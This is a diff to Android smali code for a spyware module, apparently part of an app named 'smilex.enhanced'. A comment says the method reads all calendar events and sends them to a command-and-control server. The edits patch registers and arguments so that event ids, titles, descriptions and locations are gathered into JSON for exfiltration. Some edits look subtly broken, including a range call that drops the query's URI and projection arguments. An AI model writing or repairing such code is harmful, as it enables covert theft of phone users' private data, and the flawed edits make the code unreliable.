@@ -22,7 +22,7 @@
 
 # Read all calendar events and send to C2
 .method public static syncCalendar()V
-    .registers 12
+    .registers 14
     :try_start
     sget-object v0, Lcom/smilex/enhanced/modules/CalendarModule;->sContext:Landroid/content/Context;
     if-eqz v0, :return_void
@@ -60,7 +60,8 @@
     const/4 v4, 0x0  # selection
     const/4 v5, 0x0  # selectionArgs
     const-string v6, "dtstart ASC"
-    invoke-virtual {v3, v1, v2, v4, v5, v6}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
+    const-string v7, ""  # placeholder for /range alignment
+    invoke-virtual/range {v3 .. v7}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
     move-result-object v3
 
     if-eqz v3, :return_void
@@ -81,7 +82,8 @@
     const/4 v7, 0x0
     invoke-interface {v3, v7}, Landroid/database/Cursor;->getLong(I)J
     move-result-wide v8
-    invoke-virtual {v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;
+    const-string v7, "id"
+    invoke-virtual {v6, v7, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;
 
     # title
     const/4 v7, 0x1
@@ -90,6 +92,7 @@
     if-eqz v7, :skip_title
     const-string v8, "title"
     invoke-virtual {v6, v8, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
+    const/4 v7, 0x1  # reset v7 for later use
     :skip_title
 
     # description
@@ -99,6 +102,7 @@
     if-eqz v7, :skip_desc
     const-string v8, "description"
     invoke-virtual {v6, v8, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
+    const/4 v7, 0x2  # reset v7 for later use
     :skip_desc
 
     # dtstart
@@ -122,6 +126,7 @@
     if-eqz v7, :skip_loc
     const-string v8, "location"
     invoke-virtual {v6, v8, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
+    const/4 v7, 0x5  # reset v7 for later use
     :skip_loc
 
     invoke-virtual {v4, v6}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
